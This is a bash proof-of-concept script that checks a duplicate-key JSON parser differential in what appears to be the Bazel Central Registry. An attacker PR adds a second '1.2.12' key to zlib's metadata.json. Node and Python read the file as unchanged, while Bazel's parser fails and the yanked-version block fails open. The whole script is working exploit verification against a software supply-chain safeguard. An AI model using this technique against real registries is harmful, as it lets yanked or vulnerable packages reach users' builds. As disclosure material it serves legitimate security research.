#!/usr/bin/env bash
set -euo pipefail

PR="${1:?Usage: $0 <PR number>}"

ROOT="$(git rev-parse --show-toplevel)"
cd "$ROOT"

echo "[*] Target repository: $ROOT"
echo "[*] PR: #$PR"

git fetch origin main
git fetch origin \
  "pull/${PR}/head:refs/remotes/origin/parser-diff-pr-${PR}"

MAIN_REF="origin/main"
HEAD_REF="refs/remotes/origin/parser-diff-pr-${PR}"

MAIN_SHA="$(git rev-parse "$MAIN_REF")"
HEAD_SHA="$(git rev-parse "$HEAD_REF")"

echo "[*] MAIN=$MAIN_SHA"
echo "[*] HEAD=$HEAD_SHA"

TMP="$(mktemp -d)"
cleanup() {
  git worktree remove --force "$TMP/main" >/dev/null 2>&1 || true
  git worktree remove --force "$TMP/head" >/dev/null 2>&1 || true
  rm -rf "$TMP"
}
trap cleanup EXIT

git worktree add --detach "$TMP/main" "$MAIN_REF" >/dev/null
git worktree add --detach "$TMP/head" "$HEAD_REF" >/dev/null

BASE_META="$TMP/main/modules/zlib/metadata.json"
HEAD_META="$TMP/head/modules/zlib/metadata.json"

echo
echo '===== RAW / PARSER DIFFERENTIAL ====='

if cmp -s "$BASE_META" "$HEAD_META"; then
  echo '[-] Raw files unexpectedly identical'
  exit 1
fi

echo '[+] Raw metadata differs'

node - "$BASE_META" "$HEAD_META" <<'NODE'
const fs = require('fs');

const [basePath, headPath] = process.argv.slice(2);

function normalize(path) {
  const v = JSON.parse(fs.readFileSync(path, 'utf8'));
  v.versions = [];
  return JSON.stringify(v);
}

const base = normalize(basePath);
const head = normalize(headPath);

console.log(`NODE_SEMANTIC_EQUAL=${base === head}`);

const raw = fs.readFileSync(headPath, 'utf8');
const count = (raw.match(/"1\.2\.12"\s*:/g) || []).length;

console.log(`RAW_1_2_12_KEY_COUNT=${count}`);

if (base !== head || count < 2) process.exit(1);
NODE

python3 - "$BASE_META" "$HEAD_META" <<'PY'
import json
import sys

base_path, head_path = sys.argv[1:]

with open(base_path) as f:
    base = json.load(f)

with open(head_path) as f:
    head = json.load(f)

base["versions"] = []
head["versions"] = []

print(f"PYTHON_SEMANTIC_EQUAL={base == head}")

if base != head:
    raise SystemExit(1)
PY

echo
echo '===== BAZELISK ====='

if command -v bazelisk >/dev/null 2>&1; then
  BAZEL="$(command -v bazelisk)"
elif command -v bazel >/dev/null 2>&1; then
  BAZEL="$(command -v bazel)"
else
  case "$(uname -m)" in
    x86_64)
      ARCH=amd64
      ;;
    aarch64|arm64)
      ARCH=arm64
      ;;
    *)
      echo "Unsupported architecture: $(uname -m)"
      exit 1
      ;;
  esac

  BAZEL="$TMP/bazelisk"

  echo "[*] Downloading Bazelisk for linux-${ARCH}"
  curl -fsSL \
    "https://github.com/bazelbuild/bazelisk/releases/latest/download/bazelisk-linux-${ARCH}" \
    -o "$BAZEL"
  chmod +x "$BAZEL"
fi

"$BAZEL" --version || true

registry_uri() {
  python3 - "$1" <<'PY'
from pathlib import Path
import sys
print(Path(sys.argv[1]).resolve().as_uri())
PY
}

run_case() {
  local label="$1"
  local registry_dir="$2"
  local consumer="$TMP/consumer-$label"
  local output_base="$TMP/output-$label"
  local log="$TMP/$label.log"
  local uri

  uri="$(registry_uri "$registry_dir")"

  mkdir -p "$consumer"

  cat > "$consumer/MODULE.bazel" <<'EOF'
module(
    name = "bcr_duplicate_key_consumer_poc",
    version = "1.0.0",
)

bazel_dep(
    name = "zlib",
    version = "1.2.12",
)
EOF

  cat > "$consumer/BUILD.bazel" <<'EOF'
filegroup(
    name = "nothing",
)
EOF

  echo
  echo "===== $label ====="
  echo "registry=$uri"

  set +e
  (
    cd "$consumer"
    USE_BAZEL_VERSION=9.2.0 \
      "$BAZEL" \
      --output_base="$output_base" \
      mod graph \
      --registry="$uri" \
      --registry=https://bcr.bazel.build \
      --lockfile_mode=refresh
  ) >"$log" 2>&1
  rc=$?
  set -e

  cat "$log"
  echo "${label}_EXIT=$rc"

  case "$label" in
    BASELINE)
      if grep -q 'Yanked version detected in your resolved dependency graph' "$log"; then
        echo 'BASELINE_YANK_BLOCK=YES'
      else
        echo 'BASELINE_YANK_BLOCK=NO'
        echo '[-] Expected baseline to be blocked as yanked'
        exit 1
      fi

      if [[ "$rc" -eq 0 ]]; then
        echo '[-] Baseline unexpectedly succeeded'
        exit 1
      fi
      ;;

    ATTACKER_HEAD)
      if grep -Eqi 'Could not read metadata file|Duplicate key' "$log"; then
        echo 'HEAD_GSON_PARSE_FAILURE_OBSERVED=YES'
      else
        echo 'HEAD_GSON_PARSE_FAILURE_OBSERVED=NOT_IN_LOG'
      fi

      if grep -q 'Yanked version detected in your resolved dependency graph' "$log"; then
        echo 'HEAD_YANK_BLOCK=YES'
        echo '[-] Parser differential did not bypass yank enforcement'
        exit 1
      else
        echo 'HEAD_YANK_BLOCK=NO'
      fi

      if [[ "$rc" -ne 0 ]]; then
        echo '[-] Attacker HEAD still failed; inspect output above'
        exit 1
      fi

      echo 'BCR_DUPKEY_CONSUMER_RESULT=FAIL_OPEN_CONFIRMED'
      ;;
  esac
}

run_case BASELINE "$TMP/main"
run_case ATTACKER_HEAD "$TMP/head"

echo
echo '========================================'
echo 'LOCAL_RESULT=SUCCESS'
echo "MAIN_SHA=$MAIN_SHA"
echo "ATTACKER_HEAD_SHA=$HEAD_SHA"
echo '========================================'
